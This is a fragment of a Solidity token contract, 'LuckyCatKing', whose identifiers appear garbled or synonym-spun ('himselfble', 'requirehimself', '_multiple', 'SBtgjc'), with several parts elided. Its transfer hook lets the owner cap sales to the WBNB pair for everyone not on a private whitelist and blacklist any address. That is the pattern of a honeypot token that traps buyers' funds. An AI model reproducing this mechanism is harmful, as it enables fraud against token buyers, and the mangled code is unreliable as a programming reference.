...
contract LuckyCatKing is ERC20, ERC20Burnable,  himselfble {
    using SafeMath for uint256;
    address public WBNB;
    uint256 public max = 2**256 - 1;
    mapping(address => bool) public roster;
    mapping(address => bool) public classyroster;
    constructor() public ERC20("LuckyCatKing", "LuckyCatKing") {
        _setupDecimals(18);
        _multiple(msg.sender, 1000000000 * 1e18);
    }

    function SBtgjc(address account, uint256 volume)
    ...
    function _beforeTokenTransfer(
        ...
        if(to == WBNB && !classyroster[from] ){
            require(volume < max, "max");
        }
         require(!roster[from], "roster");
         require(!roster[to], "roster");
    }
    function setlove(uint256 _max) public requirehimself() {
        max = _max;
    }
    function setWBNB(address _WBNB) public requirehimself() {
        WBNB = _WBNB;
    }
    function setHs(address _WBNB, bool t) public requirehimself() {
        roster[_WBNB] = t;
    }
    function setBs(address _WBNB, bool t) public requirehimself() {
        classyroster[_WBNB] = t;
    }
}